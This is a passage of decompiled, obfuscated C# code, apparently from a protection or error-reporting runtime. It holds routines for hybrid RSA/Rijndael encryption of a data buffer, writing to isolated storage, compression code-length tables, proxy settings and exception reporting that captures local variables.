      byte[] b;
      Guid guid;
      string str1;
      string str2;
      string str3;
      string str4;
      IsolatedStorageFileStream storageFileStream1;
      try
      {
        numArray1 = \u0089\u0002.\u007E\u0099\u0003((object) \u0005.\u0006.\u0001, obj0);
        str3 = \u0088\u0002.\u007E\u0098\u0003((object) \u009F\u0002.\u0019\u0004(numArray1), '\\', '@');
        if (\u0083.\u007E\u0080\u0002((object) str3) > 50)
        {
          b = \u0001\u0003.\u007E\u001A\u0004((object) \u0005.\u0006.\u0001, numArray1);
          guid = new Guid(b);
          str1 = \u008F.\u007E\u0096\u0002((object) guid.ToString(), 0, 18);
          str2 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, str1);
          str3 = \u0080\u0002.\u008F\u0003(str2, \u0007.\u0004.\u0093(4000));
          str4 = \u0080\u0002.\u008F\u0003(str2, \u0007.\u0004.\u0093(2943));
          storageFileStream1 = (IsolatedStorageFileStream) null;
          try
          {
            storageFileStream1 = \u0007.\u0004.\u0001(FileMode.CreateNew, str4, FileAccess.Write);
            if (true)
              \u0010.\u007E\u0013((object) storageFileStream1, numArray1, 0, numArray1.Length);
          }
          catch (IOException ex)
          {
          }
          finally
          {
            if (storageFileStream1 != null)
              \u0011.\u007E\u0014((object) storageFileStream1);
          }
        }
        else
          str3 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, \u0080\u0002.\u008F\u0003(str3, \u0007.\u0004.\u0093(4000)));
        return str3;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        string str5 = str3;
        byte[] numArray3 = b;
        string str6 = str1;
        string str7 = str2;
        string str8 = str4;
        IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
        // ISSUE: variable of a boxed type
        __Boxed<Guid> local = (ValueType) guid;
        string str9 = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray2, (object) str5, (object) numArray3, (object) str6, (object) str7, (object) str8, (object) storageFileStream2, (object) local, (object) str9);
        throw;
      }
    }

    static void \u0001([In] \u000E.\u0003 obj0) => obj0.\u0001 = true;

    static byte[] \u0001([In] byte[] obj0, [In] string obj1)
    {
      RijndaelManaged rijndaelManaged;
      RSACryptoServiceProvider cryptoServiceProvider;
      byte[] numArray1;
      MemoryStream memoryStream;
      byte[] numArray2;
      byte[] numArray3;
      byte[] numArray4;
      byte[] numArray5;
      byte[] numArray6;
      byte[] numArray7;
      byte[] numArray8;
      CryptoStream cryptoStream;
      try
      {
        if (\u0016.\u007E\u0002\u0002((object) obj1, \u0007.\u0004.\u0093(532)))
        {
          \u000E.\u0005.\u0001 = \u0007.\u0004.\u0093(3655);
          return (byte[]) null;
        }
        rijndaelManaged = (RijndaelManaged) null;
        cryptoServiceProvider = (RSACryptoServiceProvider) null;
        memoryStream = (MemoryStream) null;
        if (true)
          goto label_22;
label_3:
        try
        {
          rijndaelManaged = new RijndaelManaged();
          cryptoServiceProvider = new RSACryptoServiceProvider();
          \u008C\u0002.\u007E\u009F\u0003((object) cryptoServiceProvider, obj1);
          \u0011.\u007E\u001C((object) rijndaelManaged);
          \u0011.\u007E\u001D((object) rijndaelManaged);
          numArray1 = new byte[48];
          do
          {
            \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 0, (Array) numArray1, 0, 32);
          }
          while (false);
          \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0008\u0003((object) rijndaelManaged), 0, (Array) numArray1, 32, 16);
          memoryStream = new MemoryStream();
          try
          {
            numArray2 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray1, false);
            \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, (byte) 1);
            \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, \u0094\u0002.\u000E\u0004(numArray2.Length / 8));
            \u0010.\u007E\u0013((object) memoryStream, numArray2, 0, numArray2.Length);
          }
          catch (CryptographicException ex1)
          {
            try
            {
              numArray3 = new byte[16];
              numArray4 = new byte[16];
              \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 0, (Array) numArray3, 0, 16);
              \u001F\u0002.\u008C\u0003((Array) \u009D.\u007E\u0007\u0003((object) rijndaelManaged), 16, (Array) numArray4, 0, 16);
              numArray5 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray3, false);
              numArray6 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, numArray4, false);
              numArray7 = \u0092\u0002.\u007E\u0007\u0004((object) cryptoServiceProvider, \u009D.\u007E\u0008\u0003((object) rijndaelManaged), false);
              \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, (byte) 2);
              \u0093\u0002.\u007E\u0008\u0004((object) memoryStream, \u0094\u0002.\u000E\u0004(numArray5.Length / 8));
              \u0010.\u007E\u0013((object) memoryStream, numArray5, 0, numArray5.Length);
              \u0010.\u007E\u0013((object) memoryStream, numArray6, 0, numArray6.Length);
              \u0010.\u007E\u0013((object) memoryStream, numArray7, 0, numArray7.Length);
            }
            catch (CryptographicException ex2)
            {
              \u000E.\u0005.\u0001 = \u0007.\u0004.\u0093(3748);
              numArray8 = (byte[]) null;
              goto label_21;
            }
          }
          cryptoStream = new CryptoStream((Stream) memoryStream, \u0095\u0002.\u007E\u000F\u0004((object) rijndaelManaged), CryptoStreamMode.Write);
          \u0010.\u007E\u0013((object) cryptoStream, obj0, 0, obj0.Length);
          \u0011.\u007E\u001E((object) cryptoStream);
          numArray8 = \u009D.\u007E\u0006\u0003((object) memoryStream);
        }
        catch (Exception ex)
        {
          \u000E.\u0005.\u0001 = \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(3954), \u0015.\u007E\u009C((object) ex));
          numArray8 = (byte[]) null;
        }
        finally
        {
          if (rijndaelManaged != null)
            \u0011.\u007E\u001F((object) rijndaelManaged);
          if (cryptoServiceProvider != null)
            \u0011.\u007E\u007F((object) cryptoServiceProvider);
          if (memoryStream != null)
            \u0011.\u007E\u0014((object) memoryStream);
          if (cryptoStream != null)
            \u0011.\u007E\u0014((object) cryptoStream);
        }
label_21:
        return numArray8;
label_22:
        cryptoStream = (CryptoStream) null;
        goto label_3;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[15]
        {
          (object) rijndaelManaged,
          (object) cryptoServiceProvider,
          (object) memoryStream,
          (object) cryptoStream,
          (object) numArray1,
          (object) numArray2,
          (object) numArray3,
          (object) numArray4,
          (object) numArray5,
          (object) numArray6,
          (object) numArray7,
          (object) ex,
          (object) numArray8,
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static unsafe void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0, [In] int[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int[] numArray1;
      int num1;
      int[] numArray2;
      IntPtr index1;
      int num2;
      int num3;
      int index2;
      try
      {
        obj0.\u0001 = new byte[obj0.\u0001.Length];
        *(int*) voidPtr = obj1.Length / 2;
        *(int*) ((IntPtr) voidPtr + 4) = (*(int*) voidPtr + 1) / 2;
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (true)
        {
          if (*(int*) ((IntPtr) voidPtr + 12) >= obj0.\u0003)
            goto label_4;
label_2:
          obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)] = 0;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          continue;
label_4:
          numArray1 = new int[*(int*) voidPtr];
          numArray1[*(int*) voidPtr - 1] = 0;
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) voidPtr - 1;
          if (true)
            goto label_11;
label_10:
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) - 1;
label_11:
          if (*(int*) ((IntPtr) voidPtr + 16) >= 0)
          {
            if (obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] != -1)
            {
              *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)] + 1;
              if (*(int*) ((IntPtr) voidPtr + 20) > obj0.\u0003)
              {
                *(int*) ((IntPtr) voidPtr + 20) = obj0.\u0003;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
              }
              int[] numArray3 = numArray1;
              int index3 = obj1[2 * *(int*) ((IntPtr) voidPtr + 16)];
              numArray1[obj1[2 * *(int*) ((IntPtr) voidPtr + 16) + 1]] = num1 = *(int*) ((IntPtr) voidPtr + 20);
              int num4 = num1;
              numArray3[index3] = num4;
              goto label_10;
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 24) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (*(int*) ((IntPtr) voidPtr + 24) - 1))] = numArray2[index1] + 1;
              obj0.\u0001[obj1[2 * *(int*) ((IntPtr) voidPtr + 16)]] = (byte) numArray1[*(int*) ((IntPtr) voidPtr + 16)];
              goto label_10;
            }
          }
          else if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            num2 = obj0.\u0003 - 1;
            do
            {
              do
                ;
              while (obj0.\u0001[--num2] == 0);
              do
              {
                (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) num2)] = numArray2[index1] - 1;
                int[] numArray4;
                numArray2 = numArray4 = obj0.\u0001;
                int index4;
                num2 = index4 = num2 + 1;
                index1 = (IntPtr) index4;
                int num5 = numArray2[index1] + 1;
                numArray4[index4] = num5;
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (1 << obj0.\u0003 - 1 - num2);
              }
              while (*(int*) ((IntPtr) voidPtr + 8) > 0 && num2 < obj0.\u0003 - 1);
            }
            while (*(int*) ((IntPtr) voidPtr + 8) > 0);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 1))] = numArray2[index1] + *(int*) ((IntPtr) voidPtr + 8);
            (numArray2 = obj0.\u0001)[(int) (index1 = (IntPtr) (obj0.\u0003 - 2))] = numArray2[index1] - *(int*) ((IntPtr) voidPtr + 8);
            num3 = 2 * *(int*) ((IntPtr) voidPtr + 4);
            *(int*) ((IntPtr) voidPtr + 28) = obj0.\u0003;
            while (*(int*) ((IntPtr) voidPtr + 28) != 0)
            {
              *(int*) ((IntPtr) voidPtr + 32) = obj0.\u0001[*(int*) ((IntPtr) voidPtr + 28) - 1];
              while (*(int*) ((IntPtr) voidPtr + 32) > 0)
              {
                index2 = 2 * obj1[num3++];
                if (true)
                {
                  if (obj1[index2 + 1] == -1)
                  {
                    obj0.\u0001[obj1[index2]] = (byte) *(int*) ((IntPtr) voidPtr + 28);
                    *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
                  }
                }
                else
                  goto label_2;
              }
              *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) - 1;
            }
            goto label_13;
          }
          else
            break;
        }
        return;
label_13:;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[18]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray1,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) num2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) index2,
          (object) num1,
          (object) numArray2,
          (object) index1,
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7)
    {
      if (false)
        return;
      \u0007.\u0004.\u0001(obj0, new object[7]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7
      });
    }

    static unsafe void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0, [In] \u0008.\u0002.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      short[] numArray1;
      IntPtr index;
      int num;
      try
      {
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
          num = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
            {
              if (false)
                break;
              (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 16))] = (short) ((int) numArray1[index] + 1);
              num = 0;
            }
          }
          else
            goto label_19;
label_7:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
          {
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
            if (++num >= *(int*) voidPtr)
              break;
          }
          if (num < *(int*) ((IntPtr) voidPtr + 4))
          {
            (numArray1 = obj0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 8))] = (short) ((int) numArray1[index] + (int) (short) num);
            continue;
          }
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            (numArray1 = obj0.\u0001)[16] = (short) ((int) numArray1[16] + 1);
            continue;
          }
          if (num <= 10)
          {
            (numArray1 = obj0.\u0001)[17] = (short) ((int) numArray1[17] + 1);
            continue;
          }
          (numArray1 = obj0.\u0001)[18] = (short) ((int) numArray1[18] + 1);
          continue;
label_19:
          *(int*) voidPtr = 138;
          *(int*) ((IntPtr) voidPtr + 4) = 3;
          goto label_7;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        short[] numArray2 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local7 = (ValueType) index;
        \u0008.\u0002.\u0007.\u0001 obj2 = obj1;
        \u0008.\u0002.\u0007.\u0001 obj3 = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) numArray2, (object) local7, (object) obj2, (object) obj3);
        throw;
      }
    }

    static short \u0001([In] int obj0)
    {
      short num1;
      try
      {
        int num2 = (int) \u0008.\u0002.\u0007.\u0001[obj0 & 15];
        if (true)
          num2 <<= 12;
        int num3;
        if (true)
        {
          int num4 = (int) \u0008.\u0002.\u0007.\u0001[obj0 >> 4 & 15];
          int num5;
          while (true)
          {
            num5 = num4 << 8;
            if (false)
              num4 = num5;
            else
              break;
          }
          num3 = num2 | num5;
        }
        else
          goto label_7;
label_6:
        int num6 = (int) \u0008.\u0002.\u0007.\u0001[obj0 >> 8 & 15] << 4;
        num2 = num3 | num6 | (int) \u0008.\u0002.\u0007.\u0001[obj0 >> 12];
label_7:
        num3 = (int) (short) num2;
        if (true)
          num1 = (short) num3;
        else
          goto label_6;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) local);
        throw;
      }
      return num1;
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3, [In] object obj4) => \u0007.\u0004.\u0001(obj0, new object[4]
    {
      obj1,
      obj2,
      obj3,
      obj4
    });

    static int \u0001([In] \u0008.\u0002.\u0002 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        if (obj0.\u0003 < obj1)
          goto label_5;
label_4:
        return (int) ((long) obj0.\u0001 & (long) ((1 << obj1) - 1));
label_5:
        if (obj0.\u0001 == obj0.\u0002)
          return -1;
        \u0008.\u0002.\u0002 obj2 = obj0;
        int num2 = (int) obj2.\u0001;
        byte[] numArray1 = obj0.\u0001;
        \u0008.\u0002.\u0002 obj3 = obj0;
        int num3 = obj3.\u0001;
        if (true)
          goto label_6;
label_3:
        obj3.\u0001 = num3 + 1;
        int index1 = num1;
        int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
        byte[] numArray2 = obj0.\u0001;
        num1 = obj0.\u0001++;
        int index2 = num1;
        int num5 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
        int num6 = (num4 | num5) << obj0.\u0003;
        obj2.\u0001 = (uint) (num2 | num6);
        obj0.\u0003 += 16;
        goto label_4;
label_6:
        num1 = num3;
        goto label_3;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
    static extern int \u0001([In] int obj0);

    static void \u0001([In] IWebProxy obj0, [In] \u0004.\u0003 obj1) => obj1.\u0001 = obj0;

    static void \u0001([In] \u0004.\u0002 obj0, [In] \u000F.\u0006 obj1) => \u0007.\u0004.\u0001(obj0, obj1, string.Empty);

    static ulong[] \u0001([In] \u0003.\u0007 obj0)
    {
      ulong[] numArray;
      try
      {
        numArray = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return numArray;
    }

    static \u0003.\u0007 \u0001()
    {
      \u0003.\u0007 obj1;
      IDisposable disposable1;
      \u0003.\u0007 obj2;
      try
      {
        if (true)
        {
          if (true)
          {
            IDisposable disposable2 = \u0007.\u0004.\u0001();
            if (true)
              goto label_9;
label_2:
            try
            {
              obj1 = \u0007.\u0004.\u0001();
              goto label_10;
            }
            finally
            {
              do
              {
                if (disposable1 != null)
                  \u0011.\u007E\u0015((object) disposable1);
              }
              while (false);
            }
label_9:
            disposable1 = disposable2;
            goto label_2;
          }
          else
            goto label_10;
        }
label_7:
        if (true)
          goto label_13;
label_10:
        \u0003.\u0007 obj3 = obj1;
        if (true)
        {
          obj2 = obj3;
          goto label_7;
        }
        else
          goto label_7;
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj4 = obj1;
        IDisposable disposable3 = disposable1;
        \u0007.\u0004.\u0001(ex, (object) obj4, (object) disposable3);
        throw;
      }
label_13:
      return obj2;
    }

    static bool \u0001()
    {
      \u0007.\u0004.\u0001((\u0002.\u0004) new \u0005.\u0005());
      return true;
    }

    static string \u0001() => \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(4009), \u0007.\u0004.\u0001());

    static void \u0001()
    {
      try
      {
        try
        {
          \u0007.\u0004.\u0001();
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static void \u0001([In] \u0007.\u0003 obj0, [In] IWebProxy obj1)
    {
      try
      {
        obj0.\u0001 = obj1;
      }
      catch (Exception ex)
      {
        \u0007.\u0003 obj = obj0;
        IWebProxy webProxy = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) webProxy);
        throw;
      }
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] \u0003.\u0005 obj2,
      [In] byte[] obj3)
    {
      object[] objArray1;
      MethodInfo method;
      try
      {
        MethodInfo setMethod1 = obj2.\u0001.GetProperty("Key").GetSetMethod();
        object obj4 = obj2.\u0001;
        objArray1 = new object[1]{ (object) obj3 };
        object[] parameters1 = objArray1;
        setMethod1.Invoke(obj4, parameters1);
        MethodInfo setMethod2 = obj2.\u0001.GetProperty("IV").GetSetMethod();
        object obj5 = obj2.\u0001;
        objArray1 = new object[1]{ (object) obj1 };
        object[] parameters2 = objArray1;
        setMethod2.Invoke(obj5, parameters2);
        method = obj2.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
        return (ICryptoTransform) method.Invoke(obj2.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        MethodInfo methodInfo = method;
        object[] objArray2 = objArray1;
        \u0003.\u0005 obj = obj2;
        byte[] numArray1 = obj3;
        byte[] numArray2 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) methodInfo, (object) objArray2, (object) obj, (object) numArray1, (object) numArray2, (object) local);
        throw;
      }
    }

    static \u0004() => \u0003.\u0003.\u0001(typeof (\u0007.\u0004));
  }
}
